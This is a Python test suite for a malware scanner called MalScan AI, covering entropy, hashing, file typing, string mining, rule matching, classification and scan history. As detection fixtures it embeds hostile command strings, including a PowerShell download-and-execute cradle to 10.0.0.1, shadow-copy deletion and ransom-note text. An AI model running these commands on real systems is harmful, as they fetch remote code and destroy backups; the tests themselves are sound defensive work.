"""Self-contained test suite for MalScan AI.

Runs with pytest if it is installed, and also standalone:

    python tests/test_malscan.py
"""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from malscan.features import extract_features  # noqa: E402
from malscan.features.entropy import (  # noqa: E402
    chi_square_uniform, printable_ratio, shannon_entropy,
)
from malscan.features.filetype import detect  # noqa: E402
from malscan.features.hashes import file_hashes, ssdeep_like  # noqa: E402
from malscan.features.schema import (  # noqa: E402
    FEATURE_NAMES, blank_features, to_vector,
)
from malscan.features.strings_features import analyse_strings  # noqa: E402
from malscan.model.predict import classify, get_classifier  # noqa: E402
from malscan.rules.engine import get_engine  # noqa: E402
from malscan.scanner import ScanError, scan_bytes  # noqa: E402
from malscan.storage.history import ScanHistory  # noqa: E402

SYSTEM_BINARY = Path(os.environ.get("SystemRoot", "C:/Windows")) / "System32" / "notepad.exe"


# --- entropy ----------------------------------------------------------
def test_entropy_bounds():
    assert shannon_entropy(b"") == 0.0
    assert shannon_entropy(b"\x00" * 1000) == 0.0, "constant data has zero entropy"
    assert shannon_entropy(bytes(range(256))) > 7.9, "uniform data approaches 8"
    assert 0 <= shannon_entropy(b"hello world") <= 8


def test_printable_and_chi2():
    assert printable_ratio(b"hello") == 1.0
    assert printable_ratio(b"\x00\x01\x02") == 0.0
    # Uniform data sits far closer to a uniform histogram than English text.
    assert chi_square_uniform(bytes(range(256)) * 8) < chi_square_uniform(b"aaaa" * 512)


# --- hashing ----------------------------------------------------------
def test_hashes_are_stable():
    digest = file_hashes(b"malscan")
    assert digest == file_hashes(b"malscan"), "hashing must be deterministic"
    # Checked against an independent implementation, so a refactor that
    # silently changed the algorithm would be caught.
    assert digest["sha256"] == (
        "00c6790e8fa77e57cd19e8b9115f1a9d68b2d36d176872e030f9a46739a4b10e"
    )
    assert digest["md5"] == "eefe6a8492ae599ca56f3d0a827e7326"
    assert file_hashes(b"malscan!") != digest


def test_fuzzy_hash_tracks_similarity():
    base = os.urandom(4096) * 8
    tweaked = base[:-100] + os.urandom(100)
    unrelated = os.urandom(len(base))
    same = sum(a == b for a, b in zip(ssdeep_like(base), ssdeep_like(tweaked)))
    diff = sum(a == b for a, b in zip(ssdeep_like(base), ssdeep_like(unrelated)))
    assert same > diff, "a near-identical file should share more blocks"


# --- file typing ------------------------------------------------------
def test_filetype_uses_content_not_extension():
    # A PE header wearing a .txt name must still be detected as a PE.
    assert detect(b"MZ\x90\x00" + b"\x00" * 100, "harmless.txt").is_pe
    assert detect(b"%PDF-1.7\n", "x.exe").is_document
    assert detect(b"PK\x03\x04" + b"\x00" * 50, "a.zip").is_archive
    assert detect(b"#!/bin/sh\necho hi\n", "s").is_script


def test_filetype_separates_java_from_macho():
    """Both formats start 0xCAFEBABE, so the following bytes must decide."""
    java = b"\xca\xfe\xba\xbe\x00\x00\x00\x41" + b"\x00" * 64   # major 65
    macho = b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + b"\x00" * 64  # 2 architectures
    assert detect(java).category == "java"
    assert detect(macho).category == "macho"


def test_filetype_recognises_ooxml_as_document():
    payload = b"PK\x03\x04" + b"\x00" * 40 + b"[Content_Types].xml" + b"word/document.xml"
    assert detect(payload, "report.docx").is_document


# --- schema -----------------------------------------------------------
def test_schema_is_consistent():
    blank = blank_features()
    assert len(blank) == len(FEATURE_NAMES)
    assert len(set(FEATURE_NAMES)) == len(FEATURE_NAMES), "no duplicate feature names"
    assert to_vector(blank) == [0.0] * len(FEATURE_NAMES)
    # Ordering must be stable: the model depends on it.
    assert to_vector({FEATURE_NAMES[3]: 5.0})[3] == 5.0


# --- strings ----------------------------------------------------------
def test_string_mining_finds_indicators():
    payload = (
        b"harmless padding " * 20
        + b"http://198.51.100.7/payload.bin\x00"
        + b"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
        + b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00"
    )
    stats = analyse_strings(payload)
    assert stats.count > 0
    assert stats.urls >= 1
    assert stats.ips >= 1
    assert stats.suspicious >= 2


def test_version_numbers_are_not_treated_as_ips():
    stats = analyse_strings(b"product version 1.0.0.1 build 0.0.0.0 here padding")
    assert stats.ips == 0


# --- rules ------------------------------------------------------------
def test_rule_engine_loads():
    engine = get_engine()
    assert engine.backend in ("yara-python", "builtin")
    assert engine.rule_count > 10, "the bundled rule file should compile"


def test_eicar_is_detected():
    eicar = (
        r"X5O!P%@AP[4\PZX54(P^)7CC)7}$"
        r"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    ).encode()
    names = [m["name"] for m in get_engine().scan(eicar)]
    assert "Test_EICAR_Signature" in names


def test_clean_text_matches_nothing_severe():
    matches = get_engine().scan(b"This is an ordinary sentence in a text file.\n" * 20)
    assert all(m["severity"] < 4 for m in matches)


# --- extraction -------------------------------------------------------
def test_extraction_on_real_binary():
    if not SYSTEM_BINARY.exists():
        print("  (skipped: no system binary available)")
        return
    result = extract_features(SYSTEM_BINARY.read_bytes(), SYSTEM_BINARY.name)
    assert result.file_type.is_pe
    assert result.pe.parsed, result.pe.error
    assert result.pe.import_count > 0
    assert len(result.pe.sections) > 0
    assert len(result.features) == len(FEATURE_NAMES)
    assert all(isinstance(v, (int, float)) for v in result.features.values())


def test_extraction_survives_garbage():
    # A file claiming to be a PE but truncated must not raise.
    result = extract_features(b"MZ\x90\x00" + os.urandom(300), "broken.exe")
    assert result.file_type.is_pe
    assert not result.pe.parsed
    assert len(result.features) == len(FEATURE_NAMES)


def test_extraction_handles_empty_and_tiny():
    for payload in (b"", b"a", b"MZ"):
        result = extract_features(payload, "tiny")
        assert len(result.features) == len(FEATURE_NAMES)


# --- classification ---------------------------------------------------
def test_classify_bands():
    assert classify(0.95) == "Malicious"
    assert classify(0.50) == "Suspicious"
    assert classify(0.05) == "Benign"
    # Custom thresholds must be honoured.
    assert classify(0.55, threshold_malicious=0.5) == "Malicious"


def test_classifier_returns_valid_probability():
    classifier = get_classifier()
    proba = classifier.predict_proba(blank_features())
    assert 0.0 <= proba <= 1.0


def test_heuristic_flags_multi_rule_files():
    """The fallback scorer must not call a heavily-flagged file benign."""
    from malscan.model.predict import _heuristic_score
    from malscan.features.schema import blank_features

    clean = blank_features()
    assert _heuristic_score(clean) < 0.40

    flagged = blank_features()
    flagged["rule_max_severity"] = 5.0
    flagged["rule_hits"] = 4.0
    flagged["str_suspicious_kw"] = 9.0
    assert _heuristic_score(flagged) >= 0.40, (
        "a file matching four rules including a severity-5 detection should "
        "reach at least the Suspicious band"
    )

    # A single mid-severity match, as ordinary Windows DLLs produce, must not.
    mild = blank_features()
    mild["rule_max_severity"] = 3.0
    mild["rule_hits"] = 1.0
    assert _heuristic_score(mild) < 0.40


# --- out-of-domain routing -------------------------------------------
def test_pe_features_usable_needs_more_than_a_header():
    """A PE that failed to parse leaves every structural feature at zero."""
    from malscan.model.predict import pe_features_usable

    parsed = blank_features()
    parsed["is_pe"] = 1.0
    parsed["pe_num_sections"] = 6.0
    assert pe_features_usable(parsed)

    header_only = blank_features()
    header_only["is_pe"] = 1.0
    header_only["pe_num_sections"] = 0.0
    assert not pe_features_usable(header_only), (
        "an MZ header alone is not the PE structure the model was trained on"
    )

    assert not pe_features_usable(blank_features())


def test_plain_text_is_not_called_suspicious():
    """This is the bug the routing was added for.

    The model reads "no imports, no sections" as a stripped binary, so a
    perfectly ordinary README used to come back at 59% malicious.
    """
    text = b"# Project notes\n\nNothing interesting happens in this file.\n" * 3
    result = scan_bytes(text, "notes.txt", save_history=False)
    assert result.prediction.engine == "content", (
        "a non-PE file must not be scored by the PE-trained model"
    )
    assert result.verdict == "Benign", (
        f"plain text scored {result.probability:.0%} malicious"
    )


def test_non_pe_still_reports_real_findings():
    """Skipping the model should not mean skipping the evidence too."""
    script = (
        b"vssadmin delete shadows /all /quiet\n"
        b"powershell -enc AAAA -windowstyle hidden\n"
        b"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/x')\n"
    )
    result = scan_bytes(script, "dropper.ps1", save_history=False)
    assert result.prediction.engine == "content"
    assert result.verdict in ("Suspicious", "Malicious"), (
        "a script that deletes shadow copies should not come back benign"
    )
    assert result.contributions, "a content verdict still needs an explanation"


def test_unparsable_pe_is_flagged_not_excused():
    header_only = blank_features()
    header_only["is_pe"] = 1.0
    clean_text = blank_features()

    from malscan.model.predict import _content_score

    assert _content_score(header_only) > _content_score(clean_text), (
        "claiming a PE header you cannot honour should score higher than "
        "never claiming to be an executable at all"
    )


def test_content_engine_explains_itself_consistently():
    """Explanation has to come from whichever scorer produced the number."""
    from malscan.model.explain import explain

    features = blank_features()
    features["rule_max_severity"] = 5.0
    features["rule_hits"] = 3.0
    contributions = explain(get_classifier(), features, engine="content")
    assert contributions, "content scoring must still yield contributions"
    named = {c.feature for c in contributions}
    assert "rule_max_severity" in named
    assert not any(f.startswith(("imp_", "sec_")) for f in named), (
        "content mode should not blame PE features it never looked at"
    )


def test_cli_glyphs_degrade_instead_of_crashing():
    """cp1252 consoles cannot encode the arrows the report prints."""
    import malscan_cli

    for glyph in (malscan_cli.UP, malscan_cli.DOWN, malscan_cli.DASH):
        assert glyph, "every glyph needs to resolve to something printable"
        if not malscan_cli._UNICODE_OK:
            glyph.encode("cp1252")  # must not raise on a legacy console


# --- scanning ---------------------------------------------------------
def test_scan_rejects_empty_file():
    try:
        scan_bytes(b"", "empty.bin", save_history=False)
    except ScanError:
        pass
    else:
        raise AssertionError("an empty file should be rejected")


def test_scan_end_to_end():
    result = scan_bytes(
        b"Just an ordinary text file with nothing of interest.\n" * 40,
        "clean.txt", save_history=False,
    )
    assert result.verdict in ("Benign", "Suspicious", "Malicious")
    assert 0.0 <= result.probability <= 1.0
    assert 0.0 <= result.confidence <= 1.0
    assert result.duration_ms >= 0
    assert result.sha256


def test_benign_system_binary_scores_lower_than_indicator_heavy_file():
    """The ordering matters more than either absolute score."""
    if not SYSTEM_BINARY.exists():
        print("  (skipped: no system binary available)")
        return

    benign = scan_bytes(SYSTEM_BINARY.read_bytes(), SYSTEM_BINARY.name,
                        save_history=False)
    nasty = scan_bytes(
        b"MZ\x90\x00" + b"\x00" * 200
        + b"powershell -EncodedCommand \x00-w hidden\x00"
        + b"vssadmin delete shadows\x00bcdedit\x00"
        + b"your files have been encrypted\x00pay the ransom\x00bitcoin wallet\x00"
        + b"CreateRemoteThread\x00WriteProcessMemory\x00VirtualAllocEx\x00"
        + os.urandom(60000),
        "indicator_heavy.bin", save_history=False,
    )
    assert nasty.probability > benign.probability, (
        f"indicator-heavy file scored {nasty.probability:.3f} but the clean "
        f"system binary scored {benign.probability:.3f}"
    )


def test_scan_is_fast_enough():
    """The stated requirement is a scan in a few seconds."""
    result = scan_bytes(os.urandom(2 * 1024 * 1024), "blob.bin", save_history=False)
    assert result.duration_ms < 15000, f"took {result.duration_ms} ms"


# --- storage ----------------------------------------------------------
def test_history_roundtrip():
    with tempfile.TemporaryDirectory() as tmp:
        history = ScanHistory(Path(tmp) / "test.db")
        result = scan_bytes(b"sample content for history " * 50, "hist.txt",
                            save_history=False)
        scan_id = history.add(result)
        assert scan_id > 0

        row = history.get(scan_id)
        assert row is not None
        assert row["filename"] == "hist.txt"
        assert row["sha256"] == result.sha256

        assert len(history.recent(limit=10)) == 1
        assert len(history.by_hash(result.sha256)) == 1

        stats = history.stats()
        assert stats["total"] == 1
        assert stats["unique_files"] == 1

        history.delete(scan_id)
        assert history.get(scan_id) is None
        assert history.stats()["total"] == 0


def test_history_filters():
    with tempfile.TemporaryDirectory() as tmp:
        history = ScanHistory(Path(tmp) / "test.db")
        for name in ("alpha.txt", "beta.txt"):
            history.add(scan_bytes(f"content {name} ".encode() * 60, name,
                                   save_history=False))
        assert len(history.recent(search="alpha")) == 1
        assert len(history.recent(search="nothing-matches")) == 0
        assert len(history.export_rows()) == 2


# --- runner -----------------------------------------------------------
def main() -> int:
    tests = [(n, f) for n, f in sorted(globals().items())
             if n.startswith("test_") and callable(f)]
    passed, failed = 0, []

    print(f"Running {len(tests)} tests\n" + "-" * 60)
    for name, fn in tests:
        try:
            fn()
        except AssertionError as exc:
            failed.append((name, f"assertion: {exc}"))
            print(f"FAIL  {name}\n        {exc}")
        except Exception as exc:
            failed.append((name, f"{type(exc).__name__}: {exc}"))
            print(f"ERROR {name}\n        {type(exc).__name__}: {exc}")
        else:
            passed += 1
            print(f"ok    {name}")

    print("-" * 60)
    print(f"{passed} passed, {len(failed)} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
